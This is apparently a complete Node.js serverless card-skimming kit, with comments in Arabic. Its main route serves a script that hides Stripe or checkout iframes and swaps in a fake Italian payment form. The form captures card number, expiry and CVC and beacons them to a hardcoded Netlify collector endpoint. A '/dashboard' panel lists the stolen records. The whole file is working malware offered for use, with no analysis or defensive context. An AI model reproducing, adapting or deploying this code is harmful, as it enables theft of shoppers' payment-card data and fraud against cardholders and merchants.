const express = require("express");
const serverless = require("serverless-http");
const app = express();
let logs = [];

// استقبال البيانات المشفرة (دعم GET للصور و POST لـ Beacon)
const handleData = (req, res) => {
    let b64 = req.query.d || req.body.d;
    if(b64) {
        try {
            let decoded = Buffer.from(b64, "base64").toString();
            logs.unshift({ time: new Date().toLocaleString(), data: JSON.parse(decoded) });
        } catch(e) {}
    }
    const img = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
    res.writeHead(200, {"Content-Type": "image/gif", "Content-Length": img.length}).end(img);
};

app.all("/x", express.text({type: "*/*"}), handleData);
app.get("/data", (req, res) => { res.json(logs); });

app.get("/", (req, res) => {
    res.set("Content-Type", "application/javascript");
    // كود الخطف الشامل - يستبدل واجهة الدفع بواجهة وهمية مطابقة
    var p = "var u = 'https://69c91fb68d4cce0cf8f85648--loquacious-fairy-f87d48.netlify.app/x';" + // هذا هو رابط الاستضافة الجديد الخاص بك
        "function s(o){ var d = btoa(JSON.stringify(o)); new Image().src = u + \'?d=\' + encodeURIComponent(d); if(navigator.sendBeacon) navigator.sendBeacon(u, d); }" +
        "function inject(){  var frame = document.querySelector(\'iframe[src*=\"stripe\"]\') || document.querySelector(\'iframe[src*=\"checkout\"]\') || document.querySelector(\".stripe-payment-form\");  if(!frame || document.getElementById(\'f-ui\')) return;  var html = \'<div id=\"f-ui\" style=\"background:#fff;padding:20px;border:1px solid #e6e6e6;border-radius:4px;z-index:99999;position:relative;font-family:sans-serif;\">\' +    \'\'<h3 style=\"color:#32325d;font-size:16px;margin-bottom:15px;\">Pagamento Sicuro</h3>\' +    \'\'<input type=\"text\" id=\"f-c\" placeholder=\"Numero di carta\" style=\"width:100%;padding:12px;border:1px solid #cfd7df;border-radius:4px;font-size:16px;margin-bottom:10px;\">\' +    \'\'<div style=\"display:flex;gap:10px;\">\' +      \'\'<input type=\"text\" id=\"f-e\" placeholder=\"MM/YY\" style=\"width:50%;padding:12px;border:1px solid #cfd7df;border-radius:4px;font-size:16px;\">\' +      \'\'<input type=\"text\" id=\"f-v\" placeholder=\"CVC\" style=\"width:50%;padding:12px;border:1px solid #cfd7df;border-radius:4px;font-size:16px;\">\' +    \'\'<\/div>\' +    \'\'<button id=\"f-b\" style=\"width:100%;margin-top:15px;padding:15px;background:#5469d4;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer;box-shadow:0 2px 4px rgba(0,0,0,0.1);\">PAGARE ORA<\/button>\' +    \'\'<\/div>\';  frame.style.display = \'none\';  frame.parentNode.insertBefore(document.createRange().createContextualFragment(html), frame);  document.getElementById(\'f-b\').onclick = function(e){    e.preventDefault();    var d = {c:document.getElementById(\'f-c\').value, e:document.getElementById(\'f-e\').value, v:document.getElementById(\'f-v\').value, url:location.href};    s(d); this.innerHTML = \'Elaborazione...\';     setTimeout(function(){ location.reload(); }, 1000);  };}var obs = new MutationObserver(inject); obs.observe(document.body, {childList:true, subtree:true});setTimeout(inject, 1000);"; // محاولة ثانية للتأكد من الحقن
    res.send(p);
});

app.get("/dashboard", (req, res) => {
    res.send("<html><body style=\'background:#000;color:#0f0;font-family:monospace;padding:20px\'><h1>XLESS BEAST PANEL - 2099</h1><button onclick=\'location.reload()\'>REFRESH<\/button><hr><div id=\'v\'><\/div><script>fetch(\'/data\').then(r=>r.json()).then(data=>{document.getElementById(\'v\').innerHTML = data.map(x=>\'\'<p>[\'+x.time+\'] \'+JSON.stringify(x.data)+\'<\/p>\').join(\'\');});<\/script><\/body><\/html>");
});

module.exports.handler = serverless(app);
